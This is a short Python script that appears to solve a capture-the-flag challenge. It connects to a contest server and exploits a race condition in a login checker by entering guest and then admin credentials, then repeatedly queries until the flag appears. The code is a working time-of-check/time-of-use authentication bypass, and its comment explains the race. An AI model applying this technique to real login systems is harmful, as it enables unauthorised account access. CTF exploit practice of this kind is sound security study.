#!/usr/bin/python
import socket
import struct
import sys
import telnetlib

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.148.54.10', 9447))
f = s.makefile('rw', bufsize=0)

# One thread checks the correctness of a global username and password
# buffers, then copies them into a loggedin_user buffer. To makes this
# race even easier to exploit, the code signals the checker valid the
# username/password after it is entered, then the checker thread blocks
# for up to 1s between verifying the correctness of the
# username/password and copying the username into loggedin_user.
f.write('1\nguest\nguest\n')
f.write('1\nadmin\nadmin\n')

while True:
    f.write('2\n')
    x = f.readline()
    if 'Congratulations, the flag' in x:
        print x
        sys.exit(0)

